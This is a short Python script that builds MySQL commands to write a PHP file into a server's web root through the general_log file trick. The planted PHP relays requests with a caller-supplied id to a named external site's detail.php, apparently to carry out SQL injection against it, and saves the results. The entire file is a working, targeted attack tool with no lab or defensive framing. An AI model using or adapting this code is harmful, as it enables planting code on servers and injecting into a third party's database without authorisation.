#!/usr/bin/env python3
"""gen_yj_out2.py - yj_out2.php (www.yijingweb.com SQLi)"""
body = '<?php $id=$_GET["id"];$ch=curl_init("http://www.yijingweb.com/webmall/detail.php?id=".$id);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/yj_result.txt",$r);echo "WROTE:".strlen($r);?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/yj_out2.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/yj_out2.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
